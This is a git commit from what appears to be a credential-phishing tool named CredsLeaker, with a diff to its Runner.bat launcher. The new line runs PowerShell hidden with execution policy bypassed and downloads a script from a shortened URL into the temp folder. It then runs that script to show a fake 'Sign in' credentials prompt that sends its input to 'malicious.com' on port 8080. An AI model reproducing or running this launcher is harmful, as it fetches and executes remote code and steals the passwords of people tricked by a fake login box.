bbc0b19d5aff8e0364bb2589f6c4b6d19e152bbd
Dvir S. Sasson <dviros@me.com>
2019-04-28 12:32:02 +0300

    Download and execution + parameters calling
    When calling the script with "-Windowstyle hidden", the credentials box will be closed when clicking on the X.

--- Runner.bat
+++ Runner.bat
@@ -1,1 +1,1 @@
-powershell.exe -executionpolicy bypass -windowstyle hidden -noninteractive -nologo -file "CredsLeaker.ps1"
+powershell -NoP -NonI -W Hidden -Exec Bypass "Invoke-RestMethod -uri "https://bit.ly/completlyinnocent" -OutFile $env:TEMP\lolz.ps1"; Powershell.exe -ExecutionPolicy bypass -Windowstyle hidden -noninteractive -nologo -file $env:temp\lolz.ps1 -Caption "Sign in" -Message "Enter your credentials" -Server "malicious.com" -Port "8080"
